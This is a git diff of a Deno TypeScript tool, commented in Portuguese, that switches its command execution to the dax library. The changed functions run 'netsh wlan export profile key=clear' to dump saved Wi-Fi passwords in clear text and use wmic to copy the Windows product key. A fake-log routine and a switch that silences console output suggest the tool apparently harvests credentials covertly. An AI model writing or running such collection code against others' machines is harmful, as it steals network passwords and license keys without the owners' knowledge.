@@ -4,6 +4,7 @@ import { DateTime } from '@luxon';
 import { delay } from '@std';
 import colors from '@colors';
 import qr from '@qrcode';
+import $ from '@dax';
 
 /** showLogs
  * Se for false, nada será exibido no console
@@ -99,9 +100,7 @@ async function NetSHProfileCollector() {
 		.catch(() => {});
 
 	// Chama a API do Windows
-	await executeCommand(
-		'netsh wlan export profile key=clear folder=.tempdata',
-	);
+	await $`netsh wlan export profile key=clear folder=.tempdata`.lines();
 
 	for await (const file of Deno.readDir('.tempdata')) {
 		/** for
@@ -136,9 +135,9 @@ async function NetSHProfileCollector() {
 }
 
 async function copyWinKey() {
-	winLKey = (await executeCommand(
-		'wmic path softwarelicensingservice get OA3xOriginalProductKey',
-	)).split('\n')[1];
+	winLKey =
+		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
+			.lines())[1];
 
 	await Deno.mkdir('WindowsKeys') // Cria pasta de chaves do Windows (se não existir)
 		.catch(() => {});
@@ -180,22 +179,6 @@ async function createFakeLogs() {
 	spinner.end('Registros excluídos.');
 
 	Deno.exit();
-}
-
-async function executeCommand(cmd: string) {
-	const process = Deno.run({
-		cmd: cmd.split(' '),
-		stdout: 'piped',
-		stderr: 'piped',
-	}); // Executa o comando
-
-	// Decodifica o retorno do processo
-	const res = new TextDecoder()
-		.decode(await process.output());
-
-	process.close(); // Encerra processo
-
-	return res;
 }
 
 function clearTags(matches: IterableIterator<RegExpMatchArray>) {
